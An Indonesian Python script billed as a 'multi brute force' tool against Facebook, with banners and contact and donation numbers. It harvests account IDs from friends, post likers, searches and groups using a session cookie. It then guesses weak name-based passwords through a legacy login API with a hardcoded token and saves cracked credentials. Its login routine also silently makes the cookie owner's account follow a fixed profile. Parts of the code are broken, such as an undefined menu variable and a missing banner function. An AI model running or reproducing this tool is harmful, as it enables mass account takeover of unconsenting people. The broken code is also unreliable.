#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JANGAN LO RECOD JUGA ANAK NGTD !
import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor
def clear():
    os.system("clear")
def aink(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def peak():
    time.sleep(0.1)
    print("""
\033[35m  __________________
\033[35m» |      ▂╲╱▂      | 
\033[35m» |      ▇▏▕▇      |
\033[35m» |       ||       |
\033[35m» |  /><>\\\//<><\  |
\033[35m» |  />/__\/__\<\  |
\033[35m» |_____| || |_____| \033[1;91m*V3.0

M&F»       »M&F   M&F»          M&F»M&F»M&F
M&F»MF»=»FM»M&F   M&F»M&F»M&F»  M&F
M&F» »M&F» »M&F   M&F»   »M&F»  M&F»M&F»
M&F»       »M&F   M&F»M&F»M&F»  M&F
\033[1;93m MULTI BRUTE FORCE

\033[90m  M&F»M&F»M&F» \033[1;92m M&F»M&F»M&F» \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m╭╮╮╱▔▔▔▔╲╭╭╮  \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m╰╲╲▏▂╲╱▂▕╱╱╯  \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m┈┈╲▏▇▏▕▇▕╱┈┈  \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m┈┈╱╲▔▕▍▔╱╲┈┈  \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m╭╱╱▕╋╋╋╋▏╲╲╮  \033[90mM&F»
\033[90m  M&F»M&F»M&F» \033[1;92m╰╯╯┈╲▂▂╱┈╰╰╯  \033[90mM&F»
\033[96m                        BY MILZU-TC <────╮
\033[96m  ───────────────────────────────────────╯
\033[93m  ──────STATUS─SERVER─PREMIUM──────
\033[1;95m      SUBSCRIBE:MILZUU TC TUTORIAL77

\033[1;95m──────>@uthor:MILZUU-TC      <───────────────╮
\033[1;95m──────>@whatsapp:083127768957<───────────────╮
\033[1;95m╭─────>@Donate :083182713104 <───────────────╮
\033[1;95m╰──》VIA :DANA,OVO,SHOPEE PAY<───────────────╮
\033[1;96mCHAT DI WHATSAPP APA YANG PERLU KAMI BANTU <─╯

\033[90m[ \033[1;92mSELAMAT DATANG @everyone !! \033[90m]
\033[1;99m      GUNAKANLAH TOllS INI DENGAN BIJAK    """)

def MilzuTC():
    Milzu=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
    if Milzu == "":
       os.system("python MBF2D.py")
    else:
       sys.exit("\033[1;91mexit\033[00m")
def mbf2d():
    time.sleep(0.1)
    print("\033[1;92mSTATUS ANDA SAAT INI ONLINE !")
    print("\033[1;94m╭======================================>")
    print("\033[96m|[\033[96m1\033[96m] MÂŠÛĶ")
    print("\033[96m|[\033[96m2\033[96m] ÛPĞŘÂĎÊ")
    print("\033[96m|[\033[96m3\033[96m] JÔÎŇ ĞŘÔÛP WHÂŤŠÂPP")
    print("\033[96m|[\033[96m4\033[96m] ĶÊŁÛÂŘ")
    print("\033[1;94m|======================================>")
    time.sleep(0.1)

    f=input("\n\033[90m╰>[>_<]👉 \033[1;93m")
    if Milzu == "1":
         print("\033[1;94m=======================================>")
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         life = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                    cek = input("\033[90m> \033[00mCoookies : \033[1;92m")
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[90m> \033[00mChange the language, please wait\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
             else:
                  exit("\033[00m[\033[91m!\033[00m]\033[00mCookies \033[1;91minvalid!!\033[00m")
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('results-life.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('results-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00mretrieved",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00mretrieved',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00mretrieved ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   baner()
                   aink('\033[1;92mANDA SEDANG AKTIF!')
                   aink('\033[1;97m╭────────────────────────────────────────────────────')
                   aink('\033[1;91m|[\033[1;93m1\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ 💎')
                   aink('\033[1;91m|[\033[1;93m2\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ 💎')
                   aink('\033[1;91m|[\033[1;93m3\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ PÊÑČÂŘÎÂŇ ŇÂMÂ 💎')
                   aink('\033[1;91m|[\033[1;93m4\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ĞŘÔÛP 💎')
                   aink('\033[1;91m|[\033[1;93m5\033[1;97m]🤖 \033[00mŘÔĶÊĎ ĎÂŘÎ ŤÊMÂŇ 💎')
                   aink('\033[1;91m|[\033[1;93m6\033[1;97m]🤖 \033[00mŁÎHÂŤ HÂŠÎŁ ŘÔĶÊĎ 💎')
                   aink('\033[1;97m|────────────────────────────────────────────────────')
                   print()
                   ngtd = input('\033[90m╰─>[>_<]👉 \033[1;93m ')
                   if ngtd =="":
                         exit("\033[00m[\033[91m!\033[00m] Dont be empty")
                   elif ngtd == '1':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif ngtd == '2':
                         username = input("\033[90m> \033[00mURL Post : \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Dont be empty")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'm.facebook.com' in username:
                                 username = username.replace('m.facebook.com','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif ngtd == '3':
                         knf = input("\033[90m> \033[00mquery : \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[00m] no result")
                   elif ngtd == '4':
                         print("\033[90m> \033[00mcan only take \033[91m100 \033[00mIDs ")
                         grab = input("\033[90m> \033[00mID group : \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m]ID wrong")
                   elif ngtd == '5':
                         knf = input("\033[90m> \033[00mUsername/Id : \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] User Not Found ")
                   elif ngtd == '6':
                         try:
                                 file1 = open("results-check.txt").read()
                                 file2 = open("results-life.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] accounts to check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 os.remove("results-check.txt")
                                 os.remove("results-life.txt")
                                 for x in life:
                                         with open('results-life.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('results-check.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\033[00m] Done")
                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-life.txt")
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[00m] you not have a results")
                   else:
                         exit("\033[00m[\033[91m!\033[00m] wrong choice")
                   print()
                   expass = input("\033[90m> \033[00mExtra Password: \033[1;92m")
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '12',
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\033[1;94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] siap")
                           print("\033[00m[\033[92m✓\033[00m]life : \033[92mresults-life.txt\033[00m")
                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")
                           print("\n\n")
                   
                   else:
                           time.sleep(0.1)
                           print("\033[94m=============================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] siap")
                           print("\033[00m[\033[91m!\033[00m] no result")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\033[00m[\033[91m!\033[00m] ConnectionError")

    elif f == "2":
         os.system("git pull")
         MilzuTC()

    elif f == "3":
         os.system("xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2")
         MilzuTC()

    elif f == "4":
         sys.exit("\033[00m[\033[91m!\033[00m]\033[91mexit\033[00m")

    else:
         MilzuTC()  


if __name__=="__main__":
     clear()
     peak()
     mbf2d()
     MilzuTC()
